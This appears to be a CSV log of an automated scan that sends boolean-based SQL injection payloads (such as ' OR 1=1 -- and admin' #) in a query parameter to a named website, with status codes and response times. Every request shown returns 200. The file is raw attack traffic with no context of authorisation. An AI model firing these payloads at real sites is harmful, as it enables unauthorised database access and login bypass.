URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.9445316791534424,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.780900239944458,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.8964567184448242,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.9094994068145752,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.91213059425354,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.11610698699951172,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.14806103706359863,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.12172508239746094,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.461484432220459,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.4632129669189453,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.5487051010131836,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.2152557373046875,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.21754980087280273,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.2123556137084961,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2142314910888672,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2208545207977295,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2307724952697754,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.22187137603759766,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.21188020706176758,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.21648478507995605,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.1993868350982666,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.5207695960998535,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.2959756851196289,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.29619288444519043,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2962455749511719,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3244767189025879,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.32933688163757324,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.33323240280151367,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2946135997772217,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.29717350006103516,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.30392932891845703,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.30626559257507324,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.30883193016052246,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.31441569328308105,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.3178691864013672,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2213819026947021,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1758625507354736,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.4890244007110596,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.4316504001617432,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.4092247486114502,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.2646715641021729,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.23189377784729,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.6503345966339111,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.4950451850891113,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.6560454368591309,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.8492639064788818,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.6616628170013428,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8507840633392334,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.6633901596069336,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3481011390686035,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.37111902236938477,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3810741901397705,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.8508639335632324,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.671698808670044,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.667623519897461,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.8570232391357422,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.6771337985992432,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.6808726787567139,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4110884666442871,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.8567590713500977,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.6846108436584473,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.4313497543334961,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.9267268180847168,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.7138071060180664,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.7207589149475098,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4711606502532959,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7577719688415527,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.7465815544128418,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.7462649345397949,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.7473394870758057,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.7449226379394531,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.6850104331970215,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.7277135848999023,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1422436237335205,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.7524428367614746,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.660879135131836,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.7016427516937256,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7029750347137451,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7060027122497559,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7035257816314697,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.7092149257659912,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.705958366394043,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1155576705932617,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.110213041305542,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.0989007949829102,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.0947422981262207,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.092742919921875,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1108782291412354,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.0871939659118652,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1183383464813232,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.084366798400879,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.1089248657226562,' OR 1=1--
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1118855476379395,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.0740764141082764,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.10756254196167,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.0990197658538818,admin' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.3181791305541992,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.096712589263916,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.49335289001464844,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4947495460510254,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.4917302131652832,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.49518728256225586,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.49406886100769043,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.3022315502166748,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.2342238426208496,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.269744873046875,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.256669282913208,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.169191598892212,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.40299391746521,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1898906230926514,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.45177793502807617,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4450249671936035,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.42833542823791504,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.44336771965026855,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4591219425201416,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2895479202270508,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.426555871963501,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.34647083282470703,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3465578556060791,admin' OR '1'='1
